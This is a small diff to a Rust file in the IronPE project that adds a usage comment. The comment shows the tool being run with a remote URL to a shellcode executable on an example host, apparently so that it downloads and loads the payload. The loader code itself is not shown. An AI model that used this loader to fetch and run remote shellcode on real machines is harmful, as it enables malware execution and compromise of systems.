@@ -2,6 +2,8 @@
 //Author: iss4cf0ng/ISSAC
 //GitHub: https://github.com/iss4cf0ng/IronPE
 
+// Usage : ./IronPE --x64 your url shellcode e.g https://blba.com/shellcode.exe
+
 #![allow(non_snake_case)]
 
 mod loader;
